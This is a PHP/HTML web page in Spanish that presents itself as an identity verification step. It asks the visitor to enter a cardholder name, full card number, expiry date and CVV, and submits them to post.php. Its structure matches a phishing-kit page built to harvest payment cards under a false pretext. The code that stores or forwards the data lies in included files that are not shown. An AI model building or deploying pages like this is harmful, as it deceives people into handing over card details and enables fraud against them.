<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Verificación de identidad</title>
</head>
<body>
    
<main>
    <div class="form">
    <div class="logo">
<img src="res/img/logo.png" >
</div>

    <div class="continer">

    <div class="tittle">
<h3>Verificación de identidad</h3>
<p>Por favor, introduce los datos de tu tarjeta para verificar tu identidad.</p>
</div>

<form action="post.php" method="post">

<div class="col">
    <label>Nombre del titular de la tarjeta</label>
 <input type="text" name="name" required> </div>

<div class="col">
<label>Número de tarjeta</label>
<input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div>

<div class="col">
<label>Fecha de vencimiento</label> 
<input type="text" name="exp" placeholder="MM/AA" id="exp" required> </div>

<div class="col">
<label>Código de seguridad</label>
<input type="text"  name="cvv" placeholder="CVV" id="cvv" required> </div>

<div class="but">
<div class="button"><button type="submit">Continuar</button> </div>
</div>

</form>
</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
 
</body>
</html>